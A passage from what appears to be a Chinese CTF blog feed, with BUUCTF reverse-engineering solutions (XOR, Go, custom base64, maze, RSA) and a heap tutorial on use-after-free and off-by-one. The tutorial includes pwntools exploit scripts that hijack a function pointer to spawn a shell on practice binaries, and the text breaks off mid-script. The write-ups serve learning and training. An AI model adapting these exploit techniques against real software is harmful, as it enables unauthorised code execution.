class="hljs-number">0x67</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(code)):<br>    code[i] ^= i<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>(code))<br><span class="hljs-comment"># flag&#123;@_R3@1ly_E2_R3verse!&#125;</span><br></code></pre></td></tr></table></figure><h1 id="MRCTF2020-hello-world-go"><a href="#MRCTF2020-hello-world-go" class="headerlink" title="[MRCTF2020]hello_world_go"></a>[MRCTF2020]hello_world_go</h1><blockquote><p>考点</p><ul><li>go语言类</li><li>二进制代码理解</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs python">// main.main<br>void __golang main_main()<br>&#123;<br>  __int64 v0; // rax<br>  io_Writer_0 typ; // [rsp+0h] [rbp-B0h]<br>  io_Reader_0 typa; // [rsp+0h] [rbp-B0h]<br>  io_Writer_0 typb; // [rsp+0h] [rbp-B0h]<br>  io_Writer_0 typc; // [rsp+0h] [rbp-B0h]<br>  _slice_interface__0 a; // [rsp+10h] [rbp-A0h]<br>  string_0 aa; // [rsp+10h] [rbp-A0h]<br>  _slice_interface__0 ab; // [rsp+10h] [rbp-A0h]<br>  _slice_interface__0 ac; // [rsp+10h] [rbp-A0h]<br>  char a_8; // [rsp+18h] [rbp-98h]<br>  _slice_interface__0 a_16a; // [rsp+20h] [rbp-90h]<br>  __int64 a_16; // [rsp+20h] [rbp-90h]<br>  string *p_string; // [rsp+60h] [rbp-50h]<br>  _slice_interface__0 v13; // [rsp+68h] [rbp-48h] BYREF<br>  char **OK_You_are_right_; // [rsp+80h] [rbp-30h]<br>  _QWORD array_1[<span class="hljs-number">2</span>]; // [rsp+88h] [rbp-28h] BYREF<br>  _QWORD array[<span class="hljs-number">3</span>]; // [rsp+98h] [rbp-18h] BYREF<br><br>  p_string = runtime_newobject(&amp;RTYPE_string);<br>  array[<span class="hljs-number">0</span>] = &amp;RTYPE_string;<br>  array[<span class="hljs-number">1</span>] = &amp;off_4EA530;                       // <span class="hljs-string">&quot;Please input the flag: &quot;</span><br>  typ.tab = go_itab__ptr_os_File_comma_io_Writer;<br>  typ.data = os_Stdout;<br>  a.array = array;<br>  a.<span class="hljs-built_in">len</span> = 1LL;<br>  a.cap = 1LL;<br>  fmt_Fprint(typ, a);<br>  array_1[<span class="hljs-number">0</span>] = &amp;RTYPE__ptr_string;<br>  array_1[<span class="hljs-number">1</span>] = p_string;<br>  typa.tab = go_itab__ptr_os_File_comma_io_Reader;<br>  typa.data = os_Stdin;<br>  aa.<span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;%s&quot;</span>;<br>  aa.<span class="hljs-built_in">len</span> = 2LL;<br>  a_16a.array = array_1;<br>  a_16a.<span class="hljs-built_in">len</span> = 1LL;<br>  a_16a.cap = 1LL;<br>  fmt_Fscanf(typa, aa, a_16a);<br>  <span class="hljs-keyword">if</span> ( p_string-&gt;<span class="hljs-built_in">len</span> == <span class="hljs-number">24</span> &amp;&amp; (runtime_memequal(), a_8) )<br>  &#123;<br>    v0 = 0LL;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    runtime_cmpstring();<br>    <span class="hljs-keyword">if</span> ( a_16 &gt;= <span class="hljs-number">0</span> )<br>      v0 = 1LL;<br>    <span class="hljs-keyword">else</span><br>      v0 = -1LL;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( v0 )<br>  &#123;<br>    v13.array = &amp;RTYPE_string;<br>    v13.<span class="hljs-built_in">len</span> = &amp;off_4EA550;                      // <span class="hljs-string">&quot;Wrong&quot;</span><br>    typc.tab = go_itab__ptr_os_File_comma_io_Writer;<br>    typc.data = os_Stdout;<br>    ac.array = &amp;v13;<br>    ac.<span class="hljs-built_in">len</span> = 1LL;<br>    ac.cap = 1LL;<br>    fmt_Fprintln(typc, ac);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    v13.cap = &amp;RTYPE_string;<br>    OK_You_are_right_ = &amp;off_4EA540;            // <span class="hljs-string">&quot;OK!You are right!&quot;</span><br>    typb.tab = go_itab__ptr_os_File_comma_io_Writer;<br>    typb.data = os_Stdout;<br>    ab.array = &amp;v13.cap;<br>    ab.<span class="hljs-built_in">len</span> = 1LL;<br>    ab.cap = 1LL;<br>    fmt_Fprintln(typb, ab);<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 找到比较的那行代码，查看汇编能看到flag</span><br><br><span class="hljs-comment"># flag&#123;hello_world_gogogo&#125;</span><br></code></pre></td></tr></table></figure><h1 id="ACTF新生赛2020-usualCrypt"><a href="#ACTF新生赛2020-usualCrypt" class="headerlink" title="[ACTF新生赛2020]usualCrypt"></a>[ACTF新生赛2020]usualCrypt</h1><blockquote><p>考点</p><ul><li>base64变表</li><li>动态调试</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> v3; // esi<br>  _DWORD v5[<span class="hljs-number">3</span>]; // [esp+8h] [ebp-74h] BYREF<br>  __int16 v6; // [esp+14h] [ebp-68h]<br>  char v7; // [esp+16h] [ebp-66h]<br>  char v8[<span class="hljs-number">100</span>]; // [esp+18h] [ebp-64h] BYREF<br><br>  sub_403CF8(&amp;error__n_);<br>  scanf(<span class="hljs-string">&quot;%s&quot;</span>, v8);<br>  memset(v5, <span class="hljs-number">0</span>, sizeof(v5));<br>  v6 = <span class="hljs-number">0</span>;<br>  v7 = <span class="hljs-number">0</span>;<br>  sub_401080((<span class="hljs-built_in">int</span>)v8, strlen(v8), (<span class="hljs-built_in">int</span>)v5);<br>  v3 = <span class="hljs-number">0</span>;<br>  // <span class="hljs-string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span><br>  <span class="hljs-keyword">while</span> ( *((_BYTE *)v5 + v3) == aZmxhz3tignxlxj[v3] )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( ++v3 &gt; strlen((const char *)v5) )<br>      goto LABEL_6;<br>  &#125;<br>  sub_403CF8(aError);                           // <span class="hljs-string">&quot;error!\n&quot;</span><br>LABEL_6:<br>  <span class="hljs-keyword">if</span> ( v3 - <span class="hljs-number">1</span> == strlen(aZmxhz3tignxlxj) )      // <span class="hljs-string">&quot;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&quot;</span><br>    // <span class="hljs-string">&quot;Are you happy?yes!\n&quot;</span><br>    <span class="hljs-keyword">return</span> sub_403CF8(aAreYouHappyYes);<br>  <span class="hljs-keyword">else</span><br>    // <span class="hljs-string">&quot;Are you happy?No!\n&quot;</span><br>    <span class="hljs-keyword">return</span> sub_403CF8(aAreYouHappyNo);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 可以通过动态调试的手段获取变表，最后还有一个大小写互换的操作</span><br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Base64_change_decode</span>(<span class="hljs-params">Str, enc</span>):<br>    model = <span class="hljs-string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span><br>    <span class="hljs-built_in">print</span>(base64.b64decode(enc.translate(<span class="hljs-built_in">str</span>.maketrans(Str, model))).decode())<br><br>alp = <span class="hljs-string">&#x27;ABCDEFQRSTUVWXYPGHIJKLMNOZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span><br>enc = <span class="hljs-string">&#x27;zMXHz3TIgnxLxJhFAdtZn2fFk3lYCrtPC2l9&#x27;</span>.swapcase()<br>Base64_change_decode(alp,enc)<br><br><span class="hljs-comment">#flag&#123;bAse64_h2s_a_Surprise&#125;</span><br></code></pre></td></tr></table></figure><h1 id="HDCTF2019-Maze"><a href="#HDCTF2019-Maze" class="headerlink" title="[HDCTF2019]Maze"></a>[HDCTF2019]Maze</h1><blockquote><p>考点</p><ul><li>Maze类</li><li>upx脱壳</li><li>花指令 ‘E8’</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">int</span> __cdecl main(<span class="hljs-built_in">int</span> argc, const char **argv, const char **envp)<br>&#123;<br>  <span class="hljs-built_in">int</span> i; // [esp+10h] [ebp-14h]<br>  _BYTE v5[<span class="hljs-number">16</span>]; // [esp+14h] [ebp-10h] BYREF<br><br>  sub_401140(aGoThroughTheMa);                  // <span class="hljs-string">&quot;Go through the maze to get the flag!\n&quot;</span><br>  scanf(<span class="hljs-string">&quot;%14s&quot;</span>, v5);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">13</span>; ++i )<br>  &#123;<br>    switch ( v5[i] )<br>    &#123;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;a&#x27;</span>:<br>        --*(_DWORD *)asc_408078;                // <span class="hljs-string">&quot;\a&quot;</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;d&#x27;</span>:<br>        ++*(_DWORD *)asc_408078;                // <span class="hljs-string">&quot;\a&quot;</span><br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>        --dword_40807C;<br>        <span class="hljs-keyword">break</span>;<br>      <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;w&#x27;</span>:<br>        ++dword_40807C;<br>        <span class="hljs-keyword">break</span>;<br>      default:<br>        <span class="hljs-keyword">continue</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">if</span> ( *(_DWORD *)asc_408078 == <span class="hljs-number">5</span> &amp;&amp; dword_40807C == -<span class="hljs-number">4</span> )// <span class="hljs-string">&quot;\a&quot;</span><br>  &#123;<br>    sub_401140(aCongratulation);                // <span class="hljs-string">&quot;Congratulations!\n&quot;</span><br>    sub_401140(aHereIsTheFlagF);                // <span class="hljs-string">&quot;Here is the flag:flag&#123;%s&#125;\n&quot;</span><br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    sub_401140(aTryAgain);                      // <span class="hljs-string">&quot;Try again...\n&quot;</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># Exp</span><br><span class="hljs-comment">## 7*10的地图</span><br><span class="hljs-comment"># flag&#123;ssaaasaassdddw&#125;</span><br></code></pre></td></tr></table></figure><h1 id="SUCTF2019-SignIn"><a href="#SUCTF2019-SignIn" class="headerlink" title="[SUCTF2019]SignIn"></a>[SUCTF2019]SignIn</h1><blockquote><p>考点</p><ul><li>基本RSA</li></ul></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> libnum<br><br>p=<span class="hljs-number">366669102002966856876605669837014229419</span><br>q=<span class="hljs-number">282164587459512124844245113950593348271</span><br><br>c = <span class="hljs-number">0xad939ff59f6e70bcbfad406f2494993757eee98b91bc244184a377520d06fc35</span><br><br>e = <span class="hljs-number">65537</span><br><br>n = <span class="hljs-number">103461035900816914121390101299049044413950405173712170434161686539878160984549</span><br><span class="hljs-built_in">print</span>(n)<br><br>d = gmpy2.invert(e, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br><br><span class="hljs-comment"># 求明文</span><br>M = <span class="hljs-built_in">pow</span>(c, d, n)  <span class="hljs-comment"># 快速求幂取模运算</span><br><br><span class="hljs-built_in">print</span>(libnum.n2s(<span class="hljs-built_in">int</span>(M)))<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PWN-BUUCTF-2</title>
    <link href="/PWN-BUUCTF-2/"/>
    <url>/PWN-BUUCTF-2/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>BUUCTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HEAP</title>
    <link href="/HEAP/"/>
    <url>/HEAP/</url>
    
    <content type="html"><![CDATA[<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/introduction/">CTF-WIKI</a></p><h1 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>UAF全称：Using-After-Free</p><ul><li>浅显理解：在free没有置零的情况下，那么该堆是被保留的，也就说note[x]被保存了，依旧可以通过Index来show对应的内容，即<code>note[x]-&gt;print(note[x]-&gt;content)</code>。但是不可以写了,即禁用<code>Edit(note[x])</code>。再通过malloc申请同样大小空间的堆，会返回上一个申请过这个大小的堆（地址）（当然有限制，这里先不讲）</li></ul><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p><img src="/../Images/1743056643241-4bc88e1b-5328-48bd-a6e5-c78ecdda93a4.png"></p><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="ctfshowpwn141"><a href="#ctfshowpwn141" class="headerlink" title="ctfshowpwn141"></a>ctfshowpwn141</h3><p>根据原理，我们只需要将chunk[x]-&gt;func的地址改为backdoor即可，然后调用chunk[x]-&gt;func(chunk[x]-&gt;content)，实现getshell</p><h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python">p = p32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> p64 <br>u = u32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> u64<br><br>libcPath = <span class="hljs-string">&#x27;/home/ty/ctf/libc&#x27;</span><br>libcPath = libcPath + <span class="hljs-string">&#x27;/i386/&#x27;</span> <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> libcPath + <span class="hljs-string">&#x27;/amd64/&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">&#x27;size :&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content :&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Del</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br>Add(<span class="hljs-number">32</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>Add(<span class="hljs-number">20</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>Del(<span class="hljs-number">0</span>)<br>Del(<span class="hljs-number">1</span>)<br><br>backdoor = elf.sym[<span class="hljs-string">&#x27;use&#x27;</span>]<br>Add(<span class="hljs-number">8</span>,p(backdoor))<br>show(<span class="hljs-number">0</span>)<br><br>inter()<br></code></pre></td></tr></table></figure><h4 id="代码解读"><a href="#代码解读" class="headerlink" title="代码解读"></a>代码解读</h4><p>这里要注意，只有chunk-&gt;content具有读写能力</p><p><img src="/../Images/1743057454539-2cba3bd3-0b47-458e-9bca-84c3badb6323.png"></p><ol><li><p>为什么前两个Note的content的大小要满足 &gt;&#x3D; 4 &amp;&amp; !&#x3D; 8</p><ul><li>根据原理，我们知道，如果size&#x3D;8，那么我们通过流程可知，chunk[2]-&gt;content —&gt; chunk[1]—&gt;content，从而不能修改func的地址到backdoor</li></ul></li><li><p>为什么最后一个Note的content的大小一定是8</p><ul><li>保证它分配的地址一定是chunk[0]—&gt;func，从而利用content的读写性去修改其地址</li></ul></li></ol><h1 id="Heap-block-overlap"><a href="#Heap-block-overlap" class="headerlink" title="Heap block overlap"></a>Heap block overlap</h1><h2 id="chunk的结构（堆）"><a href="#chunk的结构（堆）" class="headerlink" title="chunk的结构（堆）"></a>chunk的结构（堆）</h2><p><strong>prev_size</strong>:若前一个物理相邻的chunk是free chunk，则表示其大小。否则用于存储前一个chunk的数据</p><p><img src="/../Images/1743064752606-86f7b81c-44ab-460e-91c8-209d2df5e3f2.png"></p><ul><li>x8664下prev_size 和 size+A+M+P 各自占8个字节</li><li>i386下prev_size 和 size+A+M+P 各自占4个字节</li></ul><ol><li>chunk的起始大小为：Initial_size &#x3D; prev_size + （size+A+M+P） &#x3D;&#x3D; 0x10 (x64)&#x2F;0x8(x32)</li><li>chunk的最小大小为(x64)：0x20 (0x21) [Initial_size+0x10]&#x2F;(x32)：0x10 (0x11) [Initial_size+0x8]</li></ol><p>要注意一点</p><p>最终chunk大小的计算如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#AMD64</span><br>co = <span class="hljs-number">1</span><br>size = n<br>chunk_size = <span class="hljs-number">0x21</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span>(n &lt;= Initial_size*co + sizeof(prev_size)):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        co += <span class="hljs-number">1</span><br>        chunk_size += <span class="hljs-number">0x10</span><br><span class="hljs-comment"># 0x10+8</span><br><span class="hljs-comment"># 0x20+8</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#I386</span><br>co = <span class="hljs-number">0</span><br>size = n<br>chunk_size = <span class="hljs-number">0x11</span><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">if</span>(n &lt;= (Initial_size+ <span class="hljs-number">0x10</span>*co + sizeof(prev_size))):<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">else</span>:<br>        co += <span class="hljs-number">1</span><br>        chunk_size += <span class="hljs-number">0x10</span><br><span class="hljs-comment"># 0x8+4</span><br><span class="hljs-comment"># 0x8+0x10+4</span><br></code></pre></td></tr></table></figure><h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h2><h3 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h3><h4 id="ctfshowpwn142"><a href="#ctfshowpwn142" class="headerlink" title="ctfshowpwn142"></a>ctfshowpwn142</h4><p>整理一下其结构体类型得到如下：</p><p><img src="/../Images/1743080240818-4d6f93a7-d7db-4063-9b34-81df397f269b.png"></p><p><img src="/../Images/1743079997975-506101f8-532b-40b6-946f-1accf8fe5a79.png"></p><ol><li><p>Create Heap</p><ul><li><p>首先申请了两个地址的空间</p></li><li><p>第一个八字节地址用来存放    heaparray[i]-&gt;size</p></li><li><p>第二个八字节地址空间是一个地址，指向这个堆的内容：heaparray[i]-&gt;content</p></li></ul></li></ol><p><img src="/../Images/1743080220547-1ffc40b0-57f7-468b-9a10-8efb948c6959.png"></p><ol start="2"><li><p>Edit Heap</p><ul><li><p>往heaparray[i]-&gt;content 存放的地址里写东西</p></li><li><p>大小是heaparray[i]-&gt;size+1，即申请堆的内容空间大小+1</p></li><li><p>存在堆溢出（off-by-one）</p></li></ul></li></ol><p><img src="/../Images/1743080374788-576b6366-c417-4cee-a039-c14b8928e0c3.png"></p><ol start="3"><li>Show Heap<ul><li>打印堆heaparray[i]-&gt;content内容的空间大小以及内容</li></ul></li></ol><p><img src="/../Images/1743080532649-07529157-722d-413e-b64a-133ff0f490ea.png"></p><ol start="4"><li><p>Delete Heap</p><ul><li><p>分别释放堆，并置零，不存在UAF</p></li><li><p>heaparray[i]-&gt;content</p></li><li><p>heaparray[i]-&gt;size</p></li></ul></li></ol><p><img src="/../Images/1743080587477-1c1ee13a-8323-43c9-a2fe-47658d33af1b.png"></p><h5 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python">p = p32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> p64 <br>u = u32 <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> u64<br><br>libcPath = <span class="hljs-string">&#x27;/home/ty/ctf/libc&#x27;</span><br>libcPath = libcPath + <span class="hljs-string">&#x27;/i386/&#x27;</span> <span class="hljs-keyword">if</span> i386 <span class="hljs-keyword">else</span> libcPath + <span class="hljs-string">&#x27;/amd64/&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Add</span>(<span class="hljs-params">size,content</span>):<br>    sla(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sla(<span class="hljs-string">&#x27;Size of Heap : &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Content of heap:&#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Edit</span>(<span class="hljs-params">index,content</span>):<br>    sla(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br>    sla(<span class="hljs-string">&#x27;Content of heap : &#x27;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sla(<span class="hljs-string">&#x27;choice :&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sla(<span class="hljs-string">&#x27;Index :&#x27;</span>,<span class="hljs-built_in">str</span>(index))<br><br><br><span class="hljs-keyword">def</span> <span 